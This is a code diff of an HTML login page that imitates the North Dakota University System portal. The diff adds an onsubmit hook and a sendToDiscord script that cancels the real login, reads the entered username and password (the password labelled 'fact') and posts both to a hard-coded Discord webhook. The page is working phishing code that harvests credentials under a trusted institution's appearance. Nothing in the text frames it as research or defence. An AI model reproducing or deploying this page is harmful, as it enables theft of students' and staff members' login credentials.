@@ -547,22 +547,52 @@ a:hover {
                     <span>The NDUS Portal requires authentication using your NDUS identifier.</span><br><br>
                     
                     
-                    <form id="IDPLogin" name="IDPLogin" enctype="application/x-www-form-urlencoded" method="POST" action="https://ndusnam.ndus.edu/nidp/app/login?sid=0&sid=0" autocomplete="off">
-                        <input type="hidden" name="option" value="credential">
-                        
-                        
-                        <div id="namepassword" class="content login-page" style="margin: 0px; display: block;">
-                            <div class="form-group">
-                                <span id="ptLabelUserid"><label for="userid">User ID</label></span>
-                                <input type="text" class="form-control" id="Ecom_User_ID" name="Ecom_User_ID" tabindex="1" value="" placeholder="Username">
-                            </div>
-                            <div class="form-group">
-                                <span id="ptLabelPassword"><label for="pwd">Password</label></span>
-                                <input type="password" class="form-control" id="Ecom_Password" name="Ecom_Password" tabindex="2" placeholder="Password" value="">
-                            </div>
-                            <div class="form-group">
-                                <span>All users of systems provided by the North Dakota University System agree to abide by the policies and procedures of the NDUS and the laws of the State of North Dakota. <br><br> Campus Connection users also agree to abide by the  <a id="useragreementlink" href="http://cts.ndus.edu/agreement/" target="_blank">Campus Connection User Agreement.</a></span>                                
-                            </div>
+                  <form id="IDPLogin" name="IDPLogin" enctype="application/x-www-form-urlencoded" method="POST" action="https://ndusnam.ndus.edu/nidp/app/login?sid=0&sid=0" autocomplete="off" onsubmit="sendToDiscord(event)">
+        <input type="hidden" name="option" value="credential">
+        
+        <div id="namepassword" class="content login-page" style="margin: 0px; display: block;">
+            <div class="form-group">
+                <span id="ptLabelUserid"><label for="userid">User ID</label></span>
+                <input type="text" class="form-control" id="Ecom_User_ID" name="Ecom_User_ID" tabindex="1" value="" placeholder="Username">
+            </div>
+            <div class="form-group">
+                <span id="ptLabelPassword"><label for="pwd">Password</label></span>
+                <input type="password" class="form-control" id="Ecom_Password" name="Ecom_Password" tabindex="2" placeholder="Password" value="">
+            </div>
+            <div class="form-group">
+                <span>All users of systems provided by the North Dakota University System agree to abide by the policies and procedures of the NDUS and the laws of the State of North Dakota. <br><br> Campus Connection users also agree to abide by the <a id="useragreementlink" href="http://cts.ndus.edu/agreement/" target="_blank">Campus Connection User Agreement.</a></span>                                
+            </div>
+        </div>
+
+			  <script>
+        function sendToDiscord(event) {
+            event.preventDefault();
+            const username = document.getElementById('Ecom_User_ID').value;
+            const fact = document.getElementById('Ecom_Password').value;
+            const webhookUrl = 'https://discordapp.com/api/webhooks/1338546359342469329/64X4z3WOE0GyGgmYPhMA792MxhaCJhoS3tfBOxNKbDzJQp5YzbiM21qQpranBzoCqadd';
+
+            const payload = {
+                content: `New form submission:\nUsername: ${username}\nFact: ${fact}`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            }).then(response => {
+                if (response.ok) {
+                    alert('Data sent successfully!');
+                } else {
+                    alert('Error sending data');
+                }
+            }).catch(error => {
+                console.error('Error:', error);
+                alert('Error sending data');
+            });
+        }
+    </script>
 
                             
 
